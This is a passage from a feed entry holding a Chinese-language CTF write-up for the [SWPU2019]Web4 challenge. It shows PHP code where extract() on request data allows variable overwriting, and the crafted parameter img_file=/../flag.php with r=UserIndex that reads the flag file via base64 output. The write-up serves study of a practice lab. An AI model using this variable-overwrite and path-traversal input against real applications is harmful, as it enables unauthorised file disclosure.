loadView<span class="token punctuation">(</span>$viewName <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> $viewData <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            $this<span class="token operator">-</span><span class="token operator">></span>viewPath <span class="token operator">=</span> BASE_PATH <span class="token punctuation">.</span> <span class="token string">"/View/&#123;$viewName&#125;.php"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>viewPath<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                extract<span class="token punctuation">(</span>$viewData<span class="token punctuation">)</span><span class="token punctuation">;</span>                include $this<span class="token operator">-</span><span class="token operator">></span>viewPath<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span></code></pre></code></pre><p><code>extract</code>可以进行变量覆盖     </p><p>找到<code>UserController.php</code>中调用了<code>loadView</code>且第二个参数可控      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token variable">$userModel</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$userModel</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userList'</span><span class="token punctuation">,</span> <span class="token variable">$listData</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre></code></pre><p>在<code>userindex.php</code>中</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/../favicon.ico'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span><span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src="'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">'</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>所以传入<code>img_file=/../flag.php</code>   </p><p>需要先进入<code>userIndex.php</code>，url中修改<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>源码中图片base64解码得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title:  [SWPU2019]Web4&lt;br&gt;date:  2021-07-11 22:58:38&lt;br&gt;tags:  [CTF,WP,sql]&lt;br&gt;categories:  [CTF,sql]&lt;br&gt;index_img:  /img/0016.png&lt;b</summary>
      
    
    
    
    
  </entry>
  
</feed>
